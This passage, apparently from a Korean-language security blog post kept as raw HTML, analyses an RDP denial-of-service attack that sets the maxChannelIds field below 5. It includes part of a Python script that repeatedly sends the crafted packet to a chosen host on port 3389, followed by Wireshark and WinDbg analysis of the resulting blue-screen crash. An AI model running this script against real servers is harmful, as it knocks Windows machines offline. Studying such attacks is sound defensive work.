601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 550px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA50lEQVQI12NIS89LSc2FoKTknKLiqtq6lpralrq61qaWzrDweDePwKLiytq61vyC8qjo5KiY5JjY1IzMwsSkLIa/f//+RwK/fv2EMCDihcVVxqYOz549//Xr5+vXr96+ffP+/bvPnz/9BgOG/Pyy3LxSCMrOKSkqrm5t621t62lu7W5t64lLSPcLiCgtq8kvKEtNy42KTo6PT4+NSwsLj09KzmbYv//gsWMnjx49cfToiQ0bNq9bt+H8+YuXLl+9ePHy9es3cvNKXdwCdu/Zd/DQkW3bd27btnPjpi2bNm3dsnX7nj37AVWllHO2ShBmAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 2\"\n        title=\"image 6 1 2\"\n        src=\"/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png\"\n        srcset=\"/static/2304c7bac2498acf0ebac31796cdead7/e9ff0/image-6.1.2.png 180w,\n/static/2304c7bac2498acf0ebac31796cdead7/f21e7/image-6.1.2.png 360w,\n/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png 550w\"\n        sizes=\"(max-width: 550px) 100vw, 550px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x01\\\\x01\\\\x04\\\\x01\\\\x01\\\\x01\\\\x01\\\\xff\\\" \n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x30\\\\x19\\\\x02\\\\x04\\\\x00\\\\x00\\\\x00\\\\x00\\\"     \\# maxChannelids</code></pre></div>\n<p><strong>5. 변조 패킷 전송 부분</strong></p>\n<p>변조 패킷 덤프를 대상 서버로 RDP 기본 포트 3389를 향해 TCP 프로토콜\n통신을 진행한다. 연결이 성사되면 변조 패킷 덤프를 전송한후 그에 대한\n응답 값을 받은 후 연결이 종료된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">HOST <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 사용자측 인자 값 (대상 호스트 입력)</span>\n\nPORT <span class=\"token operator\">=</span> <span class=\"token number\">3389</span>        <span class=\"token comment\"># TCP/3389</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token comment\"># IPv4 주소 사용/TCP 프로토콜 통신</span>\n\n    s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span>PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 수립</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"sending: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token comment\">#페이로드 전송</span>\n\n    rec <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 대상 서버 응답 값</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"received: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rec<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 종료</span></code></pre></div>\n<h3 id=\"공격-코드-실행\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\" aria-label=\"공격 코드 실행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 실행</h3>\n<p><strong>1. 공격 코드 동작</strong></p>\n<p>변조되어진 패킷을 TCP 프로토콜 통신을 통해 전송한다. 공격자 측에서 보낸\n페이로드를 보낸 후 대상 서버는 정상적인 RDP 패킷으로 인지한후 응답 값을\n보낸다. 공격자 측에서 인터럽트를 걸지 않는 이상 계속 패킷을 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAlUlEQVQY043LWw6CMBBAUTcj7cxQClgahNJaAoISI0Lc/1YMxg9fiSY39++sLse572bnJ44GyAJVQBUJF8WVTIyQRRQbIUsMc476rZXvxuF0PQzjtvR54ZW2QIpBGnAV8IzBo0+54L3tm/ps3CSTViZNnLYiqknsgPKv4AVvQh1iwdACuXsWyP6L16gZZhzVc2y5/olv1FE5xuBAG3EAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image36\"\n        title=\"image36\"\n        src=\"/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png\"\n        srcset=\"/static/2702685067c3204d6ec008aa7aeced75/e9ff0/image36.png 180w,\n/static/2702685067c3204d6ec008aa7aeced75/f21e7/image36.png 360w,\n/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 대상 서버 BSOD 장애 발생</strong></p>\n<p><strong>2.8.7</strong> 장에서 Metasploit maxchannelids module을 통해서 점검을 한 후\n발생한 BSOD 와 공격 코드를 통해보내 발생한 BSOD를 분석해본 결과 오류가\n발생하는 파일은 RDPWD.SYS, termdd.sys 인것을 유추할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACKUlEQVQozz2Ry27aUBCGB9tcfOFgH0O4GqhEqqaUS9q0iypSo/Y58gTddNNCUkACbDDmYnpZdNM3SBbdpIpCUZ+hEvu+B8hTnYOaxaf5j85o9M8/8PQ5aHkLyOOalnzSqJ7VGtWzerNydPoKtJenZvLtOwg/OprC+flveP3mO1TroDafhRO1pmocnxjm8YmsS4BQb3yDVMoH0PXurWF01opyeScIFzeC2P4pSa07UWqtBPH9GqB9oyi9ZTrtXVPqXmla71ZVuytN6/5SlI9rRemsZLn/Q9PGV+Fw6xpMc4aUTjGR8JCQCRqGx3U8PkFBsBFggITYf3O5OabTM/6vKC5q2h5VdTEctjEUYrQRstn5LpOZcZg2TW+n65MdpR7XojjcEWL/SadnW0q9rWHs//6j6+6OEHcny+MtQGsL5ZKPxaKPlrXglTkpFBaYzy8wm50jQD8gxN4Ui35gWT6WSj6Wy0vel0xOuWumCfEQ4ANCMrNAok8wErExGnU4sjy6f0vSMKDU2ZTKn4JcfoGm6SGle5hmQymd8BgAWggvSg5apoNReYy6PkFCWDZjXjlxN0gk7E3uwAsKmSmqyghlhjzCWMy5h2Wpqh2Ew9QQzbiNWtxlbvgRGKHQHoBBIEX6m2pmGFTNHipRG6Ox/TB2DLaJLDsYibCtLhEeVL5i5eEXPKx85o7YEEEYoCgOURCGPEPDcDbl8pJnaBV9PEhNeR/r2fcx7fCV/wFX0AvNQGI5fQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image37\"\n        title=\"image37\"\n        src=\"/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png\"\n        srcset=\"/static/73f5c20a69a40889040edd076c1c5a0d/e9ff0/image37.png 180w,\n/static/73f5c20a69a40889040edd076c1c5a0d/f21e7/image37.png 360w,\n/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>원격 데스크톱 연결 기능이 활성화되어 있고 대상 IP 주소만 대입한 후\n공격을 수행을 하면 해당 컴퓨터는 BSOD 장애가 발생한후 일정 시간 후에\n자동 재부팅이 진행된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA80lEQVQoz7XS226EIBAGYARMtCiCCAOKxjdx5cJDYnz/x2mC7Sbb7m6v+l0NITP/kICSJEEIdV13HMe6rtu27fs+R1O0LMv2bV1XYwxC6Or6whjz3teRcw4AnHXGGABo2zYWxlpLCEG/cc7HcdSN5pwLIaSUVVUppTjnZVkWRfERYYzRU0IIrXUW5XlOo4f1XsEYA8AwDNaC915KSSn9u+2a3ff9vu+32xxCmKaJMXZd/fB8RJZlSilRCaUUAGitm6ap69oYo5qGRWmavswnhGCMCSGUUhLdC/SPruQr7b2Hl18H51wIYZ7n463zPJ1z9x/2CY/PJnXGBhrKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image38\"\n        title=\"image38\"\n        src=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png\"\n        srcset=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/e9ff0/image38.png 180w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/f21e7/image38.png 360w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>이런 과정에서 그림 5‑5 나오면서 부팅 과정 대기 상태가 유지될 수 있으며\n복구를 하기 위해서는 관리자가 직접 수동으로 재부팅을 진행해야 정상\n부팅이 진행된다.</p>\n<h2 id=\"공격-기법-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\" aria-label=\"공격 기법 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 분석</h2>\n<h3 id=\"wireshark-동적-분석\" style=\"position:relative;\"><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"wireshark 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wireshark 동적 분석</h3>\n<p><strong>1. 세션 수립 과정</strong></p>\n<p>TCP 3-way Handshake 과정을 통해 클라이언트와 서버 사이의 세션을\n수립한다. 클라이언트 측에서 SYN 패킷을 보낼 때 기존에 사용하던 임시\n포트를 재사용하였다는 것을 TCP Port numbers reused 메시지를 통해 확인\n가능하다. 서버로부터 SYN, ACK 패킷을 받을 때 이전의 세그먼트를 확인하지\n못하고 패킷 손실이 발생했지만 클라이언트에서는 해당 응답을 받고 세션이\n수립됐다.</p>\n<p>![](./image39.png</p>\n<p><strong>2. 페이로드 전송 과정</strong></p>\n<p>RDP 연결 요청 부분의 X.224, TPKT 헤더의 바이트 값이 수정되어 서버 측으로\n전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABbUlEQVQoz03PW4/aMBCG4fz/X1RVe9WLdnfBTgJVKTnYDjSxE0IIhEPZlrwV3hb1k0bjGY0eyUEkpojJK+F0ShTHyFAylYIwCgmlRErBLI6YLzLULKaYRahQUMxivk8lmXjFZSnWWSprCZYvArdIceGceu2wK4tdVTT1lmZ7oG57Nt3AIrfor3OKUFJEIatZTC5DjBRsjOZ4GjgcDgQfniQfnyJfn75kPIuCzxNDOFGIpEMst4ikR3wrybUiNwW5Npj1mlxrklzRtC2n04nj8UjQtBtWK8O2a7lczjxyGvg/RdmSZRlaKbI0RWvte5ok1M55bL/fE2RKUZUlVVWx2+04n89cLj/53e0Yx5HbbfSg+dGSpqlHPay1n5fLJXVdMwyDryDJMpxztG3L9Xr9i9wY+x7G0c/3qPU7mOf5A7z3JEmw1tJ1nTeC+5EtSxrn+PX25hFuN+h7j/0DK/f+ZaWUR40x/n3fNU3zAP8AnsoBvacl4bgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image40\"\n        title=\"image40\"\n        src=\"/static/4277c735251ea66859591fef929bd348/d8f62/image40.png\"\n        srcset=\"/static/4277c735251ea66859591fef929bd348/e9ff0/image40.png 180w,\n/static/4277c735251ea66859591fef929bd348/f21e7/image40.png 360w,\n/static/4277c735251ea66859591fef929bd348/d8f62/image40.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>부분</p>\n<p>Client MCS Attach User Request PDU 헤더의 바이트 값이 수정되어 서버\n측으로 전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAzElEQVQI1x3G0U6DMBQGYN7/fbwyuzAKFbIbM81sm3YFIhsUGODGKDs7v4nf1Re9PAk8bz7w+iYRJxri3XAsDESsOEvNI/nylOxqSj4b2qsDGa1ISUnOWjJak1aSTtUPTdNE3rcU9fkBZVWiaY7ougYhzKDHyhRm4DICYACE9b7CfCu4NIXLMpTbLWyawQgBryT68xm+bRHVSqHIC/hTja7xuF2vHJYF4ffCS9fzst45hJXn28x54VhJyVpKdtay0fr/x6ricRx5GAb+A2LN2u7pvvNWAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image41\"\n        title=\"image41\"\n        src=\"/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png\"\n        srcset=\"/static/3ad0292170c4c918dbb0993deb58a1b1/e9ff0/image41.png 180w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/f21e7/image41.png 360w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Request PDU 바이트 변조 부분</p>\n<p>T.125 ConnectMCSPDU 패킷의 maxChannelids 필드 부분이 5보다 작은 값으로\n설정되어 전송하게 되어 버그가 발생하는 부분과 동일하다. 전체적인 패킷\n바이트 변조를 서버 측으로 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABqElEQVQozz3NW2/aMACG4fz/v9TAViq6wRrHcQ52fIrPcZxAigrSkNZqYhf7Lt67T0/Gfh7apye82eDNlnz73uY52+347gVvt22ey9dXtd/LuvUxeRedHa0JwU8pLt5NWVGhsmmLCsG2a3pa1k3V4Zr0TU9rQhoquiEMnKIfQHGiFJOChGD8OIbRZKiCZfEGireqBIL1epBWqyVNpzmdlymluWPaMtAcXpwE3lR2AHNk3vPRNVlcLlVHqdQhndfb/eP++XH/ut4/r49+XX7/YVJ7UwdXOVM5De0AUmTnmY8OZTWZn/ft8RlyZDBbcb/gfunI3JG5xTOhizHamdoOwGn4/3xKIvo607+OdJPTTZ6OhwsEa1lcILg16NbWtwZdcWe0srq2qnT6IZsBTJEuiQWLsmNRFhVqCOk451qzQXFtbIxumtw0+ZQeskZOl948ZKdAinyZmNcwA6CsIKwRIhgLzjljUojg/RjCGEIcR2O0FL0URA10kL3k2Du9rum0jFlRAAghxphSKqUUQkgprbXu37z3SitKGaVMyoFxThmz1r6/X87n9S8ui9HjiYwN/gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image42\"\n        title=\"image42\"\n        src=\"/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png\"\n        srcset=\"/static/e0afbea813524ce703ff9801e5943464/e9ff0/image42.png 180w,\n/static/e0afbea813524ce703ff9801e5943464/f21e7/image42.png 360w,\n/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ConnectMCSPDU 패킷을 전송한후 5.4.2 장의 RDP 연결 과정을 수행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABLklEQVQY01WQ61KDMBSE+/4vphZyAysQSc4JCZeqBaeEUDvj1AG1087snH979tvdiKSm3DLhnnedfB0iCoXsATzixJM6eW61HhECwIQQ2vp7312u2jBhKbeU2SRtCzlsY5UXBwAPMFFuRVKDngzOBmfA4Nz5bX9jptzGBGOKImnyon/clln+ofRRg4+pYcJq7QHDcmFy9nyXnKQNF47/YX8SilL2iAExrNjNgo0TwATgrf26MxNWbWOICDJRZ/nh4al8yd61HpVak7nV4I2ZEcOCbc9de7lqI9KGLYPZdNdJOUQEiqK/7azUEcCv70Zb3Sdz4QirKKv+B9N5cdArJBNWpA1iqKrTEm5m5+47M+5iYmJqkt/BIpXli1lrT2jFhJNyUNqXaizLozGnW+wfIQynufGzRPUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image43\"\n        title=\"image43\"\n        src=\"/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png\"\n        srcset=\"/static/1fade8e821b53c8ee407cf76befb9577/e9ff0/image43.png 180w,\n/static/1fade8e821b53c8ee407cf76befb9577/f21e7/image43.png 360w,\n/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"windbg-동적-분석\" style=\"position:relative;\"><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"windbg 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windbg 동적 분석</h3>\n<p><strong>1. 서버측 BSOD 분석</strong></p>\n<p>피해자 서버에서 발생한 BSOD 메모리 덤프를 통해 어느 부분에서 예외가\n발생하였는지 확인한다. 그림 4‑4장에서 설치한 BlueScreenView를 통해 오류\n메시지와 예외 함수 주소 값을 확인한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACXUlEQVQoz4XP3UtTcRgH8J+6kGSiCE1Wl14VgrfZH1CX+ZZGF11UqOXwDcN0lS4ym91YiIGVXqWkmVTDo27qWTtnL2fL952XOY9nhjqpmN30xs75xnQXEkkPfHj4feF5eH6EoZcJNT4lezweuFlGpWdpsAwDn9cLxvUBDOMCwzDg/H6IAg+eXwHPByGKAiRJQGhVRCgkxkWRhygsU2Ssb8zinnHH1oIS5lif9pH1Yd7NYcHjxxI3v8fv8kKYD0IOithci0DmQ4hIa/gUkhFeEbAZjqjSYhDhRSFMbG+ccDgDYDlJm3T4MDkTwOQ0h/cUA4dzAaxPhIOew6xrCTaKgSewCmrKiwk7h2nnAmwTLBifCBvFarP0HAhHB7AdVQCoWnRrHdHtDUSjEcgyj2+7OwB+I/Z1G79+7iKyLiJRO1sKvuxs4Mf3GCKKBEDDhiJpsc9REJHm7nS22WLtt8bRVDOi3TSNoqF6GDVXBtFQPYIm0xjqq0bQeGMUpqtDaK57h9rKV6irHEbj9dcwXRtCc+1bterySzx/7FglAIjR2CUfM1hhND5Sc3IeIiElxQJCWpJak8zJt/mvrDWeyE+d7KbIubM9Gfn5T5S8vG4YDFbVkNuVWIysrAdIS7MgNfWg9n9mOt29OCF3cabwqYOcON6WnptrVbKzO6HXd6h6fQcyMzuQcfQ+dLr9gf/RpVn2Fhae7rUT3ZGWdELMyv7pZjXZD3H7MHtfLijosZNLZdb0ovO9SnHJM5SV9qulxQMoKRpAeVk/KspfoOLCAeXJ7C8XK/rjJUV9aKgftP8BVTzs4OodzX8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image44\"\n        title=\"image44\"\n        src=\"/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png\"\n        srcset=\"/static/8a5fcf682c083e508949317424bf0e4c/e9ff0/image44.png 180w,\n/static/8a5fcf682c083e508949317424bf0e4c/f21e7/image44.png 360w,\n/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">  <span class=\"token operator\">**</span>덤프 파일명<span class=\"token operator\">**</span>   <span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01</span><span class=\"token punctuation\">.</span>dmp        <span class=\"token operator\">**</span>발생 날짜<span class=\"token operator\">**</span>   <span class=\"token number\">6</span><span class=\"token operator\">/</span><span class=\"token number\">10</span><span class=\"token operator\">/</span><span class=\"token number\">2020</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">37</span> PM\n  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token 